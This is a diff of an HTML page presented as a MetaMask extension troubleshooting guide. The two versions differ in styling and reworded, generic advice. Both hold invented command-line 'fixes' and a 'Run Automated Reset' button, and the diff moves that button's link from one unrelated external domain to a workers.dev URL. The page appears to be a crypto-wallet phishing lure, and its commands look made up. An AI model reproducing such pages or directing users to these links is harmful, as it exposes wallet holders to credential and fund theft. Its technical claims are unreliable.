@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Navigating Back From Market Details Retu</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: -apple-system;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,30 +41,32 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>When navigating back from the Market Details page, the Metamask extension returns to the home screen instead of the expected Exchange page, causing inconvenience and disrupting the user's workflow.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience a bug where navigating back from the Market Details page redirects them to the home screen instead of the expected Explore page.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch in the routing configuration within the Metamask extension, specifically related to the Ethereum (ETH) ecosystem. The extension fails to properly handle the back navigation, redirecting the user to the home screen instead of the intended Exchange page.</li>
+<li>The error occurs due to a misconfigured routing mechanism within the Metamask extension, causing it to lose track of the navigation history and default to the home screen when attempting to navigate back from the Market Details page.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Clear the browser cache and restart the extension to ensure a fresh start.</li>
-<li>Check for any updates to the Metamask extension and install the latest version.</li>
-<li>Use the following command to reset the extension's routing configuration:</li>
+<li>Attempt to reset the Metamask extension's navigation history by clearing browsing data and reinstalling the extension.</li>
+<li>Use the following command to manually override the navigation route:</li>
 </ul>
-<pre class="codehilite"><code class="language-bash">mm-ext reset-routing --ecosystem eth
-</code></pre>
+<div class="codehilite"><pre><span></span><code>mm-extension<span class="w"> </span>reset-navigation<span class="w"> </span>--route<span class="o">=</span>/explore
+</code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and customization options. </p>
+<ul>
+<li>Edit the extension's configuration file to set the default return route after navigating back from the Market Details page.</li>
+</ul>
+<p>You may want to use an external console for further troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured for the Ethereum (ETH) ecosystem.</li>
-<li>Latest version of the browser and operating system.</li>
-<li>A basic understanding of command-line interfaces and JSON configuration files.</li>
+<li>Metamask extension installed and configured on the browser.</li>
+<li>Ethereum (ETH) ecosystem selected as the primary network.</li>
+<li>Latest version of the Metamask extension updated and installed.</li>
 </ul>
-<div style="text-align:center; margin-top:2rem;">
-<a href="https://tron.amana-vault.site" class="btn">🛠 Run Automated Reset</a>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
